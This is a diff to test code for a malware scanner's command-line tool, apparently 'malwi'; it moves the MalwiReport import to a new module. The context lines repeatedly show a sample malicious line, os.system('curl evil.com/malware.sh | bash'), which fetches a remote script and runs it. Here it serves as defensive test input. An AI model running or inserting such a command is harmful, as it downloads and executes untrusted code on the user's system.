@@ -28,7 +28,8 @@ class TestBasicCLI:
         with patch("cli.scan.MalwiObject.load_models_into_memory"):
             with patch("cli.scan.MalwiReport.create") as mock_process:
                 # Create a mock report
-                from common.malwi_object import MalwiReport, MalwiObject
+                from common.malwi_object import MalwiObject
+                from common.malwi_report import MalwiReport
 
                 mock_obj = MalwiObject(
                     name="<module>",
@@ -88,7 +89,8 @@ os.system('curl evil.com/malware.sh | bash')
 
         with patch("cli.scan.MalwiObject.load_models_into_memory"):
             with patch("cli.scan.MalwiReport.create") as mock_process:
-                from common.malwi_object import MalwiReport, MalwiObject
+                from common.malwi_object import MalwiObject
+                from common.malwi_report import MalwiReport
 
                 # Create mock malicious object
                 mock_obj = MalwiObject(
@@ -136,7 +138,8 @@ os.system('curl evil.com/malware.sh | bash')
         for fmt in formats_to_test:
             with patch("cli.scan.MalwiObject.load_models_into_memory"):
                 with patch("cli.scan.MalwiReport.create") as mock_process:
-                    from common.malwi_object import MalwiReport, MalwiObject
+                    from common.malwi_object import MalwiObject
+                    from common.malwi_report import MalwiReport
 
                     mock_obj = MalwiObject(
                         name="<module>",
@@ -199,7 +202,8 @@ os.system('curl evil.com/malware.sh | bash')
 
         with patch("cli.scan.MalwiObject.load_models_into_memory"):
             with patch("cli.scan.MalwiReport.create") as mock_process:
-                from common.malwi_object import MalwiReport, MalwiObject
+                from common.malwi_object import MalwiObject
+                from common.malwi_report import MalwiReport
 
                 mock_obj = MalwiObject(
                     name="<module>",
@@ -259,7 +263,8 @@ os.system('curl evil.com/malware.sh | bash')
 
         with patch("cli.scan.MalwiObject.load_models_into_memory"):
             with patch("cli.scan.MalwiReport.create") as mock_process:
-                from common.malwi_object import MalwiReport, MalwiObject
+                from common.malwi_object import MalwiObject
+                from common.malwi_report import MalwiReport
 
                 # Mock objects for each processed file
                 mock_objs = []
@@ -324,7 +329,8 @@ os.system('curl evil.com/malware.sh | bash')
 
         with patch("cli.scan.MalwiObject.load_models_into_memory"):
             with patch("cli.scan.MalwiReport.create") as mock_process:
-                from common.malwi_object import MalwiReport, MalwiObject
+                from common.malwi_object import MalwiObject
+                from common.malwi_report import MalwiReport
 
                 mock_obj = MalwiObject(
                     name="<module>",
@@ -382,7 +388,8 @@ os.system('curl evil.com/malware.sh | bash')
 
         with patch("cli.scan.MalwiObject.load_models_into_memory"):
             with patch("cli.scan.MalwiReport.create") as mock_process:
-                from common.malwi_object import MalwiReport, MalwiObject
+                from common.malwi_object import MalwiObject
+                from common.malwi_report import MalwiReport
 
                 mock_report = MalwiReport(
                     all_objects=[],
@@ -437,7 +444,8 @@ os.system('curl evil.com/malware.sh | bash')
             side_effect=Exception("Model loading failed"),
         ):
             with patch("cli.scan.MalwiReport.create") as mock_process:
-                from common.malwi_object import MalwiReport, MalwiObject
+                from common.malwi_object import MalwiObject
+                from common.malwi_report import MalwiReport
 
                 mock_obj = MalwiObject(
                     name="<module>",
